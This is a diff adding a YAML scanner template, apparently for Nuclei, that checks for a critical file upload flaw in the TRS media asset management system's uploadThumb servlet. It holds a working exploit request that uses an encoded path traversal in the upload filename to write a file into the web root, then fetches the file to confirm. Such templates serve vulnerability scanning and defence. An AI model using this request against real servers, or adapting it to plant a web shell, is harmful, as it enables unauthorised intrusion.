@@ -1,0 +1,43 @@
+id: trs-uploadThumb-fileupload
+info:
+  name: 拓尔思TRS媒资管理系统 uploadThumb - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/9b017eebecefef3916a320e45424d6284bacec2d/wpoc/%E6%8B%93%E5%B0%94%E6%80%9DTRS%E5%AA%92%E8%B5%84%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%8B%93%E5%B0%94%E6%80%9DTRS%E5%AA%92%E8%B5%84%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FuploadThumb%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+  tags: trs,fileupload
+
+http:
+  - raw:
+      - |
+        POST /mas/servlets/uploadThumb?appKey=sv&uploadingId=asd HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+        ------WebKitFormBoundarySl8siBbmVicABvTX
+        Content-Disposition: form-data; name="file";
+        filename="%2e%2e%2fwebapps%2fmas%2fa%2etxt"
+        Content-Type: application/octet-stream
+
+        {{randstr}}
+        ------WebKitFormBoundarySl8siBbmVicABvTX--
+        
+      - |
+        GET /mas/a.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains_all(body_2,'{{randstr}}')
+        condition: and
